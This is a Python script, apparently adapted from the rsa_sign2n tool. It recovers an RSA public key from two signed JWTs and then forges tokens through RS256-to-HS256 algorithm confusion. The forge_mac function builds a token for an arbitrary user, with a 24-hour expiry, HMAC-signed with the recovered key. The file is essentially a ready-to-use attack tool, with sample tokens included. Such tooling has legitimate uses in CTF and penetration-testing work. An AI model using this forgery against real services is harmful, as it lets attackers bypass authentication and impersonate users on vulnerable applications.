#Tweaked script of https://github.com/silentsignal/rsa_sign2n
#My little heart goes to silent signal for this script
import sys
import json
import base64
from gmpy2 import mpz,gcd,c_div
import binascii
from Crypto.Hash import SHA256, SHA384, SHA512
from Crypto.Signature import pkcs1_15 # god bless http://ratmirkarabut.com/articles/ctf-writeup-google-ctf-quals-2017-rsa-ctf-challenge/
import asn1tools
import binascii
import time
import hmac
import hashlib

def b64urldecode(b64):
    return base64.urlsafe_b64decode(b64+("="*(len(b64) % 4)))

def b64urlencode(m):
    return base64.urlsafe_b64encode(m).strip(b"=")

def bytes2mpz(b):
    return mpz(int(binascii.hexlify(b),16))


def der2pem(der, token="RSA PUBLIC KEY"):
    der_b64=base64.b64encode(der).decode('ascii')
    
    lines=[ der_b64[i:i+64] for i in range(0, len(der_b64), 64) ]
    return "-----BEGIN %s-----\n%s\n-----END %s-----\n" % (token, "\n".join(lines), token)


def forge_mac(jwt0, public_key,user):
    jwt0_parts=jwt0.encode('utf8').split(b'.')
    jwt0_msg=b'.'.join(jwt0_parts[0:2])

    alg=b64urldecode(jwt0_parts[0].decode('utf8'))
    # Always use HS256
    alg_tampered=b64urlencode(alg.replace(b"RS256",b"HS256").replace(b"RS384", b"HS256").replace(b"RS512", b"HS256"))

    payload={"user":user,"exp":""}
    payload['exp'] = int(time.time())+86400
    #print(payload)

    payload_encoded=b64urlencode(json.dumps(payload).encode('utf8'))

    tamper_hmac=b64urlencode(hmac.HMAC(public_key,b'.'.join([alg_tampered, payload_encoded]),hashlib.sha256).digest())

    jwt0_tampered=b'.'.join([alg_tampered, payload_encoded, tamper_hmac])
    return jwt0_tampered.decode()

# e=mpz(65537) # Can be a couple of other common values

def jwt_Forgery(jwt0: str,jwt1: str):
    alg0=json.loads(b64urldecode(jwt0.split('.')[0]))
    alg1=json.loads(b64urldecode(jwt1.split('.')[0]))
    if not alg0["alg"].startswith("RS") or not alg1["alg"].startswith("RS"):
       raise Exception("Not RSA signed tokens!")
    if alg0["alg"] == "RS256":
       HASH = SHA256
    elif alg0["alg"] == "RS384":
         HASH = SHA384
    elif alg0["alg"] == "RS512":
         HASH = SHA512
    else:
        raise Exception("Invalid algorithm")
    jwt0_sig_bytes = b64urldecode(jwt0.split('.')[2])
    jwt1_sig_bytes = b64urldecode(jwt1.split('.')[2])
    if len(jwt0_sig_bytes) != len(jwt1_sig_bytes):
       raise Exception("Signature length mismatch") # Based on the mod exp operation alone, there may be some differences!

    jwt0_sig = bytes2mpz(jwt0_sig_bytes)
    jwt1_sig = bytes2mpz(jwt1_sig_bytes)

    jks0_input = ".".join(jwt0.split('.')[0:2])
    hash_0=HASH.new(jks0_input.encode('ascii'))
    padded0 = pkcs1_15._EMSA_PKCS1_V1_5_ENCODE(hash_0, len(jwt0_sig_bytes))

    jks1_input = ".".join(jwt1.split('.')[0:2])
    hash_1=HASH.new(jks1_input.encode('ascii'))
    padded1 = pkcs1_15._EMSA_PKCS1_V1_5_ENCODE(hash_1, len(jwt0_sig_bytes))

    m0 = bytes2mpz(padded0) 
    m1 = bytes2mpz(padded1)

    pkcs1 = asn1tools.compile_files('pkcs1.asn', codec='der')
    x509 = asn1tools.compile_files('x509.asn', codec='der')

    public_keys= []
    jwts = []

    for e in [mpz(3),mpz(65537)]:
        gcd_res = gcd(pow(jwt0_sig, e)-m0,pow(jwt1_sig, e)-m1)
        #To speed things up switch comments on prev/next lines!
        #gcd_res = mpz(0x143f02c15c5c79368cb9d1a5acac4c66c5724fb7c53c3e048eff82c4b9921426dc717b2692f8b6dd4c7baee23ccf8e853f2ad61f7151e1135b896d3127982667ea7dba03370ef084a5fd9229fc90aeed2b297d48501a6581eab7ec5289e26072d78dd37bedd7ba57b46cf1dd9418cd1ee03671b7ff671906859c5fcda4ff5bc94b490e92f3ba9739f35bd898eb60b0a58581ebdf14b82ea0725f289d1dac982218d6c8ec13548f075d738d935aeaa6260a0c71706ccb8dedef505472ce0543ec83705a7d7e4724432923f6d0d0e58ae2dea15f06b1b35173a2f8680e51eff0fb13431b1f956cf5b08b2185d9eeb26726c780e069adec0df3c43c0a8ad95cbd342)
        for my_gcd in range(1,100):
            my_n=c_div(gcd_res, mpz(my_gcd))
            if pow(jwt0_sig, e, my_n) == m0:
               pkcs1_pubkey=pkcs1.encode("RSAPublicKey", {"modulus": int(my_n), "publicExponent": int(e)})
               x509_der=x509.encode("PublicKeyInfo",{"publicKeyAlgorithm":{"algorithm":"1.2.840.113549.1.1.1","parameters":None},"publicKey":(pkcs1_pubkey, len(pkcs1_pubkey)*8)})
               pem_name = "%s_%d_x509.pem" % (hex(my_n)[2:18], e)
               with open(pem_name, "wb") as pem_out:
                    public_key=der2pem(x509_der, token="PUBLIC KEY").encode('ascii')
                    public_keys.append(base64.b64encode(public_key).decode())
                    pem_out.write(public_key)
               pem_name = "%s_%d_pkcs1.pem" % (hex(my_n)[2:18], e)
               with open(pem_name, "wb") as pem_out:
                     public_key=der2pem(pkcs1_pubkey).encode('ascii')
                     public_keys.append(base64.b64encode(public_key).decode())
                     pem_out.write(public_key)
    return public_keys        



# Test values:
# eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJqb2UiLCJleHAiOjEzMDA4MTkzODAsImh0dHA6Ly9leGFtcGxlLmNvbS9pc19yb290Ijp0cnVlfQ.IDcgYnWIJ0my4FurSqfiAAbYBz2BfImT-uSqKKnk-JfncL_Nreo8Phol1KNn9fK0ZmVfcvHL-pUvVUBzI5NrJNCFMiyZWxS7msB2VKl6-jAXr9NqtVjIDyUSr_gpk51xSzHiBPVAnQn8m1Dg3dR0YkP9b5uJ70qpZ37PWOCKYAIfAhinDA77RIP9q4ImwpnJuY3IDuilDKOq9bsb6zWB8USz0PAYReqWierdS4TYAbUFrhuGZ9mPgSLRSQVtibyNTSTQYtfghYkmV9gWyCJUVwMGCM5l1xlylHYiioasBJA1Wr_NAf_sr4G8OVrW1eO01MKhijpaE8pR6DvPYNrTMQ eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJqb2UiLCJleHAiOjEzMDA4MTkzODEsImh0dHA6Ly9leGFtcGxlLmNvbS9pc19yb290Ijp0cnVlfQ.AH-6ZBGA38IjQdBWbc9mPSPwdHGBcNUw1fT-FhhRA-DnX7A7Ecyaip0jt7gOkuvlXfSBXC91DU6FH7rRcnwgs474jgWCAQm6k5hOngOIce_pKQ_Pk1JU_jFKiKzm668htfG06p9caWa-NicxBp42HKB0w9RRBOddnfWk65d9JTI89clgoLxxz7kbuZIyWAh-Cp1h3ckX7XZmknTNqncq4Y2_PSlcTsJ5aoIL7pIgFQ89NkaHImALYI7IOS8nojgCJnJ74un4F6pzt5IQyvFPVXeODPf2UhMEIEyX3GEcK3ryrD_DciJCze3qjtcjR1mBd6zvAGOUtt6XHSY7UHJ3gg
